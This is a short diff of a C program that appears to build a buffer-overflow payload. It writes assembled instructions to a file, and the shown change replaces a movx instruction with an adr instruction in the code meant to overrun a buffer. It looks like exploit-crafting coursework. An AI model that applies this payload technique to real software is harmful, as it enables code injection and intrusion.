@@ -41,7 +41,7 @@ int main(void) {
 
     /* Add nullbytes to overrun the buffer and mark end of name */
 
-    uiInstr = MiniAssembler_movx(0, 0x42006A);
+    uiInstr = MiniAssembler_adr(0, 0x42006A, 0x42006C);
 
     fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
